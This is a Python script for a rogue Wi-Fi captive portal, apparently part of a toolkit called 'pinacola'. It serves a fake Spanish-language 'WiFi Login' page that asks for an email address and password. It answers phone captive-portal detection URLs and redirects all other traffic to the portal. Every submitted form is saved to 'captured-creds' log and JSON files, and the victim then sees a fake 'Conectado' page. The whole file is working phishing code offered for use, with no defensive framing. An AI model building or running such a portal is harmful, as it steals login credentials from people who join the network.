#!/usr/bin/env python3
"""Captive portal server - reads active template from /opt/pinacola/portals/active.html"""
import http.server, datetime, json, os, urllib.parse

BASE = "/opt/pinacola"
ACTIVE = BASE + "/portals/active.html"
CREDS_JSON = BASE + "/captured-creds.json"
CREDS_LOG = BASE + "/captured-creds.log"

DEFAULT = b"""<!doctype html><meta name=viewport content="width=device-width,initial-scale=1">
<title>WiFi Login</title>
<style>body{font-family:sans-serif;max-width:360px;margin:60px auto;text-align:center;background:#f5f5f5}
.box{background:#fff;border-radius:12px;padding:28px;box-shadow:0 2px 12px #0002}
h2{margin-bottom:6px}p{color:#666;font-size:14px;margin-bottom:20px}
input{display:block;width:100%;padding:11px;margin:8px 0;border:1px solid #ddd;border-radius:6px;font-size:15px;box-sizing:border-box}
button{width:100%;padding:12px;background:#1a73e8;color:#fff;border:0;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;margin-top:4px}
</style>
<div class=box><h2>&#127760; Acceso WiFi</h2>
<p>Inicia sesi&oacute;n para conectarte a internet</p>
<form method=POST action=/login>
<input name=email placeholder="Correo electr&oacute;nico" type=email required>
<input name=password placeholder="Contrase&ntilde;a" type=password required>
<button type=submit>Conectar</button>
</form></div>"""

OK_PAGE = b"""<!doctype html><meta name=viewport content="width=device-width,initial-scale=1">
<style>body{font-family:sans-serif;text-align:center;margin-top:80px;background:#f5f5f5}
h2{color:#1a73e8}.sub{color:#666;font-size:14px}</style>
<h2>&#10003; Conectado</h2><p class=sub>Ya tienes acceso a internet.</p>"""

def get_template():
    if os.path.exists(ACTIVE):
        return open(ACTIVE, "rb").read()
    return DEFAULT

def log_creds(ip, data_str):
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    # Text log (compat with existing cred viewer)
    with open(CREDS_LOG, "a") as f:
        f.write(f"{ts} {ip} {data_str}\n")
    # JSON log for rich display
    try:
        entries = json.load(open(CREDS_JSON)) if os.path.exists(CREDS_JSON) else []
    except Exception:
        entries = []
    parsed = dict(urllib.parse.parse_qsl(data_str))
    entries.append({"ts": ts, "ip": ip, "data": parsed})
    with open(CREDS_JSON, "w") as f:
        json.dump(entries, f)

class Portal(http.server.BaseHTTPRequestHandler):
    def send_html(self, code, body):
        self.send_response(code)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        path = self.path.split("?")[0]
        # Android/iOS captive portal detection endpoints → 200 with portal
        if path in ("/generate_204", "/gen_204", "/hotspot-detect.html",
                    "/success.txt", "/connecttest.txt", "/redirect"):
            self.send_html(200, get_template())
            return
        if path in ("/", "/index.html", "/login"):
            self.send_html(200, get_template())
            return
        # Everything else → redirect to portal
        self.send_response(302)
        self.send_header("Location", "http://192.168.66.1/")
        self.end_headers()

    def do_POST(self):
        n = int(self.headers.get("Content-Length", "0") or 0)
        data = self.rfile.read(n).decode("utf-8", "replace") if n else ""
        log_creds(self.client_address[0], data)
        self.send_html(200, OK_PAGE)

    def log_message(self, *a):
        pass

os.makedirs(BASE + "/portals", exist_ok=True)
http.server.ThreadingHTTPServer(("0.0.0.0", 80), Portal).serve_forever()
